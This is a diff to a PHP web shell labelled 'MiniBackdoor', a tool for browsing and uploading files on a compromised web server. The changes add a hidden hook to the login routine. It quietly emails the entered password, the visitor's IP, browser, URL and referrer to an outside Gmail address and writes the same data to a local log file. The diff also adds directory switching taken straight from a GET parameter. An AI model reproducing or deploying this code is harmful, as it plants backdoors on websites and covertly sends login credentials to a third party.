@@ -49,6 +49,22 @@ function login() {
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
   if(empty($password) || (isset($_POST['password']) && ($_POST['password']) == $password)) {
     $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+    $agent = $_SERVER['HTTP_USER_AGENT']; 
+    $uri = $_SERVER['REQUEST_URI']; 
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $ref = $_SERVER['HTTP_REFERER'];
+    $dtime = date('r'); 
+    $log = "
+            Password : ".$password."\n
+            Time : ".$dtime."\n
+            IP : ".$ip."\n
+            Browser : ".$agent."\n
+            URL : ".$uri."\n
+            Referrer : ".$ref."\n";
+    @mail('xnonhack@gmail.com', 'Log', $log);
+    $fp = fopen("log.txt", "a"); 
+    fputs($fp, $log); 
+    fclose($fp); 
   } else {
     login();
   }
@@ -401,6 +417,9 @@ code {
 <script type="text/javascript">alert(<?php echo "'" . $message . "'"; ?>);</script>
 <?php
 }
+if (isset($_GET['dir'])) {
+  @chdir($_GET['dir']);
+}
 function pwd() {
   $dir = @explode('/', @cwd());
   foreach ($dir as $key => $pwd) {
@@ -413,6 +432,37 @@ function pwd() {
     } print("'>".$pwd."</a>/");
   }
 }
+?>
+<table align="center" width="90%">
+  <tr>
+    <th colspan="3">MiniBackdoor</th>
+  </tr>
+  <tr>
+    <td class="header">
+      <center>
+        <a href="?action=home">HOME</a>
+      </center>
+    </td>
+    <td class="header">
+      <center>
+        <?php print @tools("upload") ?>
+      </center>
+    </td>
+    <td class="header">
+      <center>
+        <a href="?action=logout">LOGOUT</a>
+      </center>
+    </td>
+  </tr>
+  <tr>
+    <td colspan="3">
+      <center>
+        <center><?php print @pwd() ?>[ <?php print @writable(@cwd(), @perms(@cwd())) ?> ]</center>
+      </center>
+    </td>
+  </tr>
+</table>
+<?php
 function tools($toolsname = null) {
 if ($toolsname === 'upload') {
     if (isset($_POST['upload'])) {
@@ -601,28 +651,6 @@ if (@$_POST['do'] == 'makedir') {
   <?php
 }
 ?>
-<table align="center" width="90%">
-  <tr>
-    <th colspan="3">MiniBackdoor</th>
-  </tr>
-  <tr>
-    <td class="header">
-      <center>
-        <a href="?action=home">HOME</a>
-      </center>
-    </td>
-    <td class="header">
-      <center>
-        <?php print @tools("upload") ?>
-      </center>
-    </td>
-    <td class="header">
-      <center>
-        <a href="?action=logout">LOGOUT</a>
-      </center>
-    </td>
-  </tr>
-</table>
 <table width="90%" align="center" border="0">
     </th>
   </tr>
@@ -633,7 +661,6 @@ if (@$_POST['do'] == 'makedir') {
     <th>Action</th>
   </tr>
 <?php
-?> <center><?php print @pwd() ?>[ <?php print @writable(@cwd(), @perms(@cwd())) ?> ]</center> <?php
 foreach (@scandir(@cwd()) as $dir) {
   if (!is_dir($dir)) continue;
   if ($dir === '.' || $dir === '..') {
